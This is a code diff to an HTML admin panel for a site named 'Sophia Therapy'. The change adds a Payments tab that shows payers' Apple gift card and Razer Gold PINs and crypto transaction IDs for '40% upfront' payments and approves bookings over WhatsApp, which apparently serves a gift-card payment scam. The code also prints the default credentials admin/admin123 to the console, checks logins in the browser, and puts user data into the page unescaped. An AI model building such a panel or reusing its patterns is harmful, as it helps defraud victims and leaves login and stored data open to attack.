@@ -55,15 +55,19 @@
         .form-group input:focus, .form-group select:focus, .form-group textarea:focus { border-color: #d47a8a; outline: none; }
         .btn-primary { background: #d47a8a; color: white; border: none; padding: 0.7rem 2rem; border-radius: 60px; cursor: pointer; font-size: 1rem; transition: 0.2s; }
         .btn-primary:hover { background: #c06a7a; }
+        .btn-success { background: #2b6e4f; color: white; border: none; padding: 0.4rem 1.2rem; border-radius: 30px; cursor: pointer; }
+        .btn-success:hover { background: #1f573d; }
         .btn-danger { background: #c0392b; color: white; border: none; padding: 0.4rem 1.2rem; border-radius: 30px; cursor: pointer; }
         .btn-danger:hover { background: #a93226; }
-        .image-list, .video-list, .service-list-admin { margin-top: 1rem; max-height: 500px; overflow-y: auto; }
+        .btn-warning { background: #f39c12; color: white; border: none; padding: 0.4rem 1.2rem; border-radius: 30px; cursor: pointer; }
+        .btn-warning:hover { background: #d68910; }
+        .image-list, .video-list, .service-list-admin, .payment-list { margin-top: 1rem; max-height: 500px; overflow-y: auto; }
         .image-item, .video-item, .service-item { display: flex; align-items: center; gap: 1rem; background: #fff5f7; padding: 0.8rem; border-radius: 12px; margin-bottom: 0.5rem; }
         .image-item img, .video-item img { width: 60px; height: 60px; object-fit: cover; border-radius: 8px; }
         .service-item .service-icon { font-size: 1.8rem; color: #d47a8a; width: 40px; text-align: center; }
-        .image-item .info, .video-item .info, .service-item .info { flex: 1; }
-        .image-item .info .title, .video-item .info .title, .service-item .info .name { font-weight: 500; color: #8b3a4a; }
-        .image-item .info .details, .video-item .info .details, .service-item .info .desc { font-size: 0.85rem; color: #6b5d4f; }
+        .image-item .info, .video-item .info, .service-item .info, .payment-item .info { flex: 1; }
+        .image-item .info .title, .video-item .info .title, .service-item .info .name, .payment-item .info .name { font-weight: 500; color: #8b3a4a; }
+        .image-item .info .details, .video-item .info .details, .service-item .info .desc, .payment-item .info .details { font-size: 0.85rem; color: #6b5d4f; }
         .image-item .info .pin, .video-item .info .pin { background: #d47a8a; color: white; padding: 0.1rem 0.8rem; border-radius: 30px; font-size: 0.8rem; display: inline-block; margin-top: 0.2rem; }
         .copy-btn { background: #f8d0d8; border: none; padding: 0.2rem 0.8rem; border-radius: 30px; cursor: pointer; color: #8b3a4a; }
         .copy-btn:hover { background: #f0b8c8; }
@@ -80,12 +84,17 @@
         .user-item .user-status { font-size: 0.8rem; padding: 0.2rem 0.8rem; border-radius: 30px; }
         .user-item .user-status.active { background: #2b6e4f; color: white; }
         .user-item .user-status.inactive { background: #c0392b; color: white; }
+        .user-item .user-status.pending { background: #f39c12; color: white; }
         .instructions-box { background: #fff5f7; border-radius: 16px; padding: 1.5rem; margin-top: 1rem; border: 1px solid #f8d0d8; }
         .instructions-box h4 { color: #8b3a4a; }
         .instructions-box ol { padding-left: 1.5rem; color: #3d352c; }
         #generateResult { background: #f5ecee; border-radius: 12px; padding: 1rem; margin-top: 1rem; }
         .ad-container { background: #f5ecee; border-radius: 16px; padding: 0.8rem; margin: 1rem 0; text-align: center; border: 1px dashed #e0c8ce; min-height: 60px; display: flex; align-items: center; justify-content: center; flex-direction: column; }
         .ad-label { font-size: 0.6rem; color: #c07a8a; text-transform: uppercase; letter-spacing: 1.5px; }
+        .payment-item { display: flex; align-items: center; gap: 1rem; background: #fff5f7; padding: 0.8rem; border-radius: 12px; margin-bottom: 0.5rem; flex-wrap: wrap; }
+        .payment-item .status-pending { background: #f39c12; color: white; padding: 0.2rem 0.8rem; border-radius: 30px; font-size: 0.7rem; }
+        .payment-item .status-approved { background: #2b6e4f; color: white; padding: 0.2rem 0.8rem; border-radius: 30px; font-size: 0.7rem; }
+        .payment-item .status-declined { background: #c0392b; color: white; padding: 0.2rem 0.8rem; border-radius: 30px; font-size: 0.7rem; }
         @media (max-width: 700px) { .admin-grid { grid-template-columns: 1fr; } .login-box { padding: 2rem 1.5rem; } .admin-stats { grid-template-columns: repeat(2, 1fr); } }
     </style>
 </head>
@@ -95,7 +104,6 @@
 
     <div class="ad-container"><span class="ad-label">Sponsored</span><div id="adsterra-admin-top"></div></div>
 
-    <!-- LOGIN SCREEN -->
     <div class="admin-login" id="loginScreen">
         <div class="login-box">
             <div class="lock-icon"><i class="fas fa-lock"></i></div>
@@ -116,7 +124,6 @@
         </div>
     </div>
 
-    <!-- ADMIN PANEL -->
     <div class="admin-panel" id="adminPanel">
         <div class="admin-header">
             <h1>Admin <span>·</span> Sophia Therapy</h1>
@@ -131,19 +138,33 @@
             <div class="stat-card"><div class="number" id="totalServices">0</div><div class="label">Services</div></div>
             <div class="stat-card"><div class="number" id="totalImages">0</div><div class="label">Images</div></div>
             <div class="stat-card"><div class="number" id="totalVideos">0</div><div class="label">Videos</div></div>
+            <div class="stat-card"><div class="number" id="totalPayments">0</div><div class="label">Payments</div></div>
             <div class="stat-card"><div class="number" id="activeSubs">0</div><div class="label">Active Subs</div></div>
         </div>
 
         <div class="tabs">
-            <button class="tab-btn active" data-tab="images">Images</button>
+            <button class="tab-btn active" data-tab="payments">Payments</button>
+            <button class="tab-btn" data-tab="images">Images</button>
             <button class="tab-btn" data-tab="videos">Videos</button>
             <button class="tab-btn" data-tab="services">Services</button>
             <button class="tab-btn" data-tab="users">Users</button>
             <button class="tab-btn" data-tab="generate">Generate PIN</button>
         </div>
 
+        <!-- PAYMENTS TAB -->
+        <div class="tab-content active" id="tab-payments">
+            <div class="upload-section">
+                <h3><i class="fas fa-credit-card"></i> Payment Requests</h3>
+                <p style="color:#8a7b6b;margin-bottom:0.5rem;">Approve or decline upfront payments. Approved users get WhatsApp booking link.</p>
+                <div style="display:flex;gap:0.5rem;margin-bottom:1rem;flex-wrap:wrap;">
+                    <button class="btn-primary" id="refreshPaymentsBtn" style="padding:0.3rem 1.2rem;font-size:0.85rem;"><i class="fas fa-sync"></i> Refresh</button>
+                </div>
+                <div class="payment-list" id="paymentList"></div>
+            </div>
+        </div>
+
         <!-- IMAGES TAB -->
-        <div class="tab-content active" id="tab-images">
+        <div class="tab-content" id="tab-images">
             <div class="admin-grid">
                 <div class="upload-section">
                     <h3><i class="fas fa-upload"></i> Upload Image</h3>
@@ -297,10 +318,10 @@
             <h4><i class="fas fa-info-circle"></i> How It Works</h4>
             <ol>
                 <li>Users register and get a unique ID</li>
-                <li>Users pay admin via WhatsApp/Bank/Crypto</li>
-                <li>Admin generates a PIN for the user</li>
-                <li>User enters PIN to unlock content</li>
-                <li>Admin can also upload images and videos</li>
+                <li>Users select service and pay 40% upfront</li>
+                <li>Check Payments tab to approve/decline</li>
+                <li>Approved users get WhatsApp booking link</li>
+                <li>Generate PIN for content access after service</li>
             </ol>
         </div>
 
@@ -310,7 +331,7 @@
 
 <script>
 // ============================================================
-// ====== COMPLETE ADMIN JAVASCRIPT ======
+// ====== COMPLETE ADMIN JAVASCRIPT VERSION 5 ======
 // ============================================================
 
 // ====== LOGIN ======
@@ -384,12 +405,14 @@ var galleryItems = [];
 var videoItems = [];
 var users = [];
 var services = [];
+var paymentData = [];
 
 function loadAllData() {
     loadGallery();
     loadVideos();
     loadUsers();
     loadServices();
+    loadPayments();
     renderStats();
 }
 
@@ -417,6 +440,12 @@ function loadServices() {
     renderServiceList();
 }
 
+function loadPayments() {
+    var saved = localStorage.getItem('sophia_payments');
+    if (saved) { try { paymentData = JSON.parse(saved); } catch(e) { paymentData = []; } }
+    renderPaymentList();
+}
+
 function saveGallery() {
     localStorage.setItem('sophia_gallery', JSON.stringify(galleryItems));
     renderImageList();
@@ -435,11 +464,18 @@ function saveServices() {
     renderStats();
 }
 
+function savePayments() {
+    localStorage.setItem('sophia_payments', JSON.stringify(paymentData));
+    renderPaymentList();
+    renderStats();
+}
+
 function renderStats() {
     document.getElementById('totalImages').textContent = galleryItems.length;
     document.getElementById('totalVideos').textContent = videoItems.length;
     document.getElementById('totalUsers').textContent = users.length;
     document.getElementById('totalServices').textContent = services.length;
+    document.getElementById('totalPayments').textContent = paymentData.length;
     var active = 0;
     for (var i = 0; i < users.length; i++) {
         if (users[i].subscription && users[i].subscription.active) {
@@ -448,6 +484,66 @@ function renderStats() {
         }
     }
     document.getElementById('activeSubs').textContent = active;
+}
+
+// ====== RENDER PAYMENT LIST ======
+function renderPaymentList() {
+    var container = document.getElementById('paymentList');
+    if (!container) return;
+    if (paymentData.length === 0) {
+        container.innerHTML = '<p style="color:#d47a8a;text-align:center;padding:1rem;">No payments yet.</p>';
+        return;
+    }
+    var html = '';
+    for (var i = paymentData.length - 1; i >= 0; i--) {
+        var p = paymentData[i];
+        var statusClass = p.status === 'approved' ? 'status-approved' : p.status === 'declined' ? 'status-declined' : 'status-pending';
+        var statusText = p.status ? p.status.toUpperCase() : 'PENDING';
+        html += '<div class="payment-item"><div class="info"><div class="name">' + p.userName + ' (' + p.userId + ')</div><div class="details">Email: ' + p.userEmail + ' · Phone: ' + p.userPhone + '</div><div class="details">Amount: $' + p.amount + ' · Method: ' + p.method + '</div>';
+        if (p.method === 'apple_pay') {
+            html += '<div class="details" style="color:#d47a8a;">Apple Card PIN: <strong>' + p.pin + '</strong></div>';
+        }
+        if (p.method === 'razer_gold') {
+            html += '<div class="details" style="color:#d47a8a;">Razer PIN: <strong>' + p.razerPin + '</strong></div>';
+        }
+        if (p.method === 'crypto_btc') {
+            html += '<div class="details" style="color:#d47a8a;">Transaction ID: <strong>' + p.transactionId + '</strong></div>';
+        }
+        html += '<div class="details">Date: ' + new Date(p.date).toLocaleString() + '</div></div><div><span class="' + statusClass + '">' + statusText + '</span></div><div>';
+        if (p.status === 'pending') {
+            html += '<button class="btn-success" onclick="approvePayment(' + p.id + ')" style="padding:0.2rem 0.8rem;font-size:0.7rem;margin-right:0.3rem;">Approve</button>';
+            html += '<button class="btn-danger" onclick="declinePayment(' + p.id + ')" style="padding:0.2rem 0.8rem;font-size:0.7rem;">Decline</button>';
+        }
+        html += '</div></div>';
+    }
+    container.innerHTML = html;
+}
+
+// ====== APPROVE/DECLINE PAYMENTS ======
+function approvePayment(id) {
+    if (!confirm('Approve this payment? The user will get WhatsApp booking link.')) return;
+    for (var i = 0; i < paymentData.length; i++) {
+        if (paymentData[i].id === id) {
+            paymentData[i].status = 'approved';
+            break;
+        }
+    }
+    savePayments();
+    loadAllData();
+    alert('✅ Payment approved! User can now book via WhatsApp.');
+}
+
+function declinePayment(id) {
+    if (!confirm('Decline this payment?')) return;
+    for (var i = 0; i < paymentData.length; i++) {
+        if (paymentData[i].id === id) {
+            paymentData[i].status = 'declined';
+            break;
+        }
+    }
+    savePayments();
+    loadAllData();
+    alert('❌ Payment declined.');
 }
 
 // ====== RENDER IMAGE LIST ======
@@ -744,12 +840,14 @@ document.getElementById('refreshImagesBtn').addEventListener('click', function()
 document.getElementById('refreshVideosBtn').addEventListener('click', function() { loadAllData(); this.innerHTML = '<i class="fas fa-check"></i> Refreshed'; setTimeout(function() { this.innerHTML = '<i class="fas fa-sync"></i> Refresh'; }.bind(this), 1500); });
 document.getElementById('refreshUsersBtn').addEventListener('click', function() { loadAllData(); this.innerHTML = '<i class="fas fa-check"></i> Refreshed'; setTimeout(function() { this.innerHTML = '<i class="fas fa-sync"></i> Refresh'; }.bind(this), 1500); });
 document.getElementById('refreshServicesBtn').addEventListener('click', function() { loadAllData(); this.innerHTML = '<i class="fas fa-check"></i> Refreshed'; setTimeout(function() { this.innerHTML = '<i class="fas fa-sync"></i> Refresh'; }.bind(this), 1500); });
+document.getElementById('refreshPaymentsBtn').addEventListener('click', function() { loadAllData(); this.innerHTML = '<i class="fas fa-check"></i> Refreshed'; setTimeout(function() { this.innerHTML = '<i class="fas fa-sync"></i> Refresh'; }.bind(this), 1500); });
 
 // ====== INIT ======
 checkSession();
 
-console.log('✅ Admin Panel Ready!');
+console.log('✅ Admin Panel Version 5 Ready!');
 console.log('🔑 Default login: admin / admin123');
+console.log('💳 Approve/Decline Upfront Payments');
 </script>
 
 </body>
